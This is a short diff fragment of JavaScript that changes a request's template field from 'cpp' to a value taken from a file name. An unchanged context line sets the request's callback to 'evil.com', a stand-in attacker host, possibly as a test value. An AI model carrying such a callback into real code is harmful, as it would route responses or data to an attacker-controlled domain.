@@ -41,7 +41,7 @@ connectionPromise.then(conn => {
               end: 1548416990,
               // domain: "hellointern"
             },
-            template: 'cpp'
+            template: file.split('.')[0]
           },
           callback: 'evil.com'
         })
